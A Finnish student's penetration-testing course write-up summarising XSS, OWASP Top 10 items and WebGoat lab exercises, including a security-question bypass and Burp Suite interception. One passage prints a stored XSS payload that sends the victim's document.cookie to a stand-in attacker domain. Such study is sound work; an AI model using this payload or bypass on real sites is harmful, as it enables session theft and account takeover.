# x)

## Cross Site Scripting [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)

- Tapa injektoida javascriptiä webbisivulle
- XSS Reflected: Manipuloidaan URLia ja lähetetään URL kohteelle, ja uhrin klikatessa linkkiä Javascriptiä ajetaan tämän selaimessa.
    - Haavoittuvuutta voidaan testata esim. ajamalla missä tahansa sivun inputissa (chatit, searchit, messaget yms) scriptiä `<script>alert('toimiiko?')</script>`, ja mikäli sivulla on XSS haavoittuvuus, näytölle tulee alertti.
    - Samalla URL muokkautui ja se voidaan lähettää kenelle tahansa, ja klikkaamalla aukeaa sama alertti
- XSS Stored: URL manipuloinnin sijaan Javascriptiä talletetaan sivulle. Koodia ajetaan siis kohteen koneella aina, kun kuka tahansa menee sivustolle.
    - Inputeilla voi taas kokeilla `<script> jotain koodia </script>`
    - Javascript tallentuu sivustolle
- Joskus inputeissa maximikirjainmäärä voi rajoittaa koodin määrää. 
    - Voidaan mahdollisesti ohittaa -> Inspect, etsitään HTML elementeistä oikea inputti ja muokataan elementin max pituutta
- [BeEF](https://beefproject.com/) (Browser Exploitation Framework Project)
    - Ajamalla BeEFin javascriptiä webbisivulla, kaikki sivulla kävijät saadaan "koukkuun" BeEFiin ja näiden ip-osoitteet ja muuta tietoa
    - Koukussa oleviin koneihin voidaan nyt ajaa etänä komentoja, jotka suorittavat välittömästi kohteen päässä
- Javacriptin voi poistaa käytöstä selaimen asetuksissa. Tai blokata vain tietyille sivustoille

## [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)

### A2 Broken Authentication
- Hyökkääjillä käytössä valmiita käyttäjänimi, salasana, sanakirja-listoja, joita voidaan kokeilla kirjatutumiseen
- Ajetaan valmiita sanakirjalistoja yksinkertaisten salasanojen selvittämiseksi, esim Password1 tai vertaillaan heikkoja häshättyjä salasanoja, joissa on monta oikeaa vastausta.
- Voidaan poimia tärkeitä tietoja URLista, kuten vaikka session ID

### A3 Sensitive Data Exposure
- Tärkeän datan tulisi aina olla suojattua, cryptattua esim. SHA512. HTTPn vaarat -> ei suojattu yhteys
- Data viedään salattuna tietokantaan, mutta noutovaiheessa salaus puretaan automaattisesti, jolloin esim. SQL injektiolla voidaan saada tärkeitä tietoja, kuten luottokorttitiedot, selkokielisenä.

### A7 Cross Site Scripting
- Tarkoitus etäajaa koodia uhrin selaimessa.
- Automaattisia työkaluja, jotka tunnistaa kaikki 3 XSSn muotoa ja valmiita exploitteja
- Kahdessa kolmesta applikaatiosta löytyy XSS haavoittuvuuksia
    - PHP, J2EE / JSP, ASP.NET teknologioita sisältävistä löytyy erityisesti
- Nettisivun input kentän syötteet tulevat URLiin ja URLia voidaan muokata ajamaan jotakin javascript komentoa. Urlia jakamalla ja lopulta uhrin klikatessa sitä selain ajaa urliin upotetut javascript komennot, jotka voi aiheuttaa esimerkiksi session IDn menettämisen hyökkääjälle, joka voi kaapata käynnissä olevan session.

# z) Cross site story, esimerkki Stored XSS hyökkäyksestä
- Nettisivustolla on viestittely ominaisuus, jonka kautta sivun käyttäjät voivat jättää viestejä toisille sivustolla kävijöille, esimerkiksi jokin foorumi.
    - `<p>Hei, tässä on tämä viestini!</p>`
- Applikaatio ei prosessoi lähetettyjä viestejä muuten kuin printtaamalla ne sivustolle, joten hyökkääjä voi suoraan lähettää haitallisia viestejä muille käyttäjille. Hyökkääjä siis voi itse kirjoittaa foorumille vaikkapa alla olevan viestin:
    - `<p><script>document.location='http://www.hyökkääjä.com/cgi-bin/cookie.cgi?foo='+document.cookie</script></p>`
    - Tämän hyökkäyksen tarkoitus on lähettää uhrin session ID hyökkääjälle, jolla hyökkääjä voi varastaa istunnon oikeudet, esimerkiksi ylläpitäjältä
    - Kun uhri avaa foorumisivun missä hyökkääjän javascript on istutettu viestiin, se ajetaan uhrin selaimessa ja scripti lähettää tiedot hyökkääjän nettisivuille.
    - Hyökkääjä saa haltuunsa tietoja kaikilta sivulla kävijöiltä, kun riittävät käyttöoikeudet omaava henkilö käy sivulla, hyökkääjällä onkin sivuston käyttöoikeudet yks kaks hallussaan.

# a) [WebGoat](https://owasp.org/www-project-webgoat/)
## A2 Broken Authentication
### Authentication Bypasses
- Lähtökohtaisena tarkoituksena tehtävässä on muokata turvakysymyksen parametrejä siten, että ne voidaan ohittaa.
- 2FA Password Reset tehtävässä täytyi muokata form elementissä olevia inputteja. Muokkasin randomilla `secQuestion` arvoja, eli niiden numeroita vain isommaksi kuvan mukaisesti, eli `secQuestion0 -> secQuestion2`. Ja näin submitti meni läpi ja pääsin vaihtamaan salasanaa.
![2FA_Password_Reset](/images/2FA_Password_Reset.png)
![2FA_Password_Reset_result](/images/2FA_Password_Reset_result.png)

## A3 Sensitive Data Exposure
- Tarkoituksena tutustua siihen, miksi tärkeän datan tulisi olla kryptattua sitä lähettäessä
- Tehtävässä oli tarkoitus painaa Login nappia ja tutkia lähetettyä pyyntöä. 
![A3_login_form](/images/A3_login_form.png)
- Pyynnön näkee yksinkertaisimmillaan Firefoxin Network välilehdeltä valitsemalla lähetetty POST-pyyntö ja sen Request välilehdeltä. Näkymän username ja password kelpaavat oikeiksi vastauksiksi tehtävään.
![A3_Insecure_login](/images/A3_Insecure_login.png)
- Halusin tutkia lähetettyä pyyntöä myös jollain packet snifferillä ja googletuksen ensimmäinen tulos oli Kalissa valmiina löytyvä Burp Suite. Sen proxyn käytöstä löytyi yksinkertainen youtube video [Youtube, webpwnized](https://www.youtube.com/watch?v=7ePmWhypzBI). Ohjeita seuraamalla sain sekä Burp Suiten, että Firefoxin asetukset kohdilleen, mutta ongelmana oli vielä se, ettei Firefoxissä pystynytkään oletusasetuksilla keskeyttämään localhostissa pyörivän sivun pyyntöjä, vaikka se toimi kyllä muilla sivuilla jo.
    - Vastaus löytyi taas googlesta [portswigger](https://forum.portswigger.net/thread/burp-interception-does-not-work-for-localhost-in-chrome-a787f541) ja piti muokata Firefoxin asetuksia kirjoittamalla URL kenttään `about:config` ja sitten muuttaa asetuksen `network.proxy.allow_hijacking_localhost` arvo TRUE. Nyt toimii myös Burp Suitella localhostin interceptaus. 
- Asetusten settaamisen jälkeen voitiinkin palata WebGoattiin Log Inin äärelle ja varmistaa, että Burp Suitessa on `Intercept is ON` välilehdellä Proxy -> Intercept. Sitten vain Log Iniä klikkaamaan.
- Burp Suitessa nähdään joko suoraan Intercept välilehdellä kaapattu pyyntö, mutta paremmin kaapatut pyynnöt löytyvät välilehdeltä `HTTP History` ja sieltä POST pyyntö valitsemalla. 
![Burp_Suite_Result](/images/A3_Burp_suite_result.png)

## A7 Cross Site Scripting XSS
## A8 Request Forgeries

# b) [ATT&CK](https://attack.mitre.org/)
## Ensimmäisen alatekniikan demonstrointi
## Toisen alatekniikan demonstrointi

# e) Vulnhub Earthin jatkamista tai jokin muu harjoitusmaali johon murtautumista

### Lähteet
- [Kurssisivu, Tero Karvinen](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack)
- [ATT&CK](https://attack.mitre.org/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)
- [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)
- [BeEF](https://beefproject.com/)

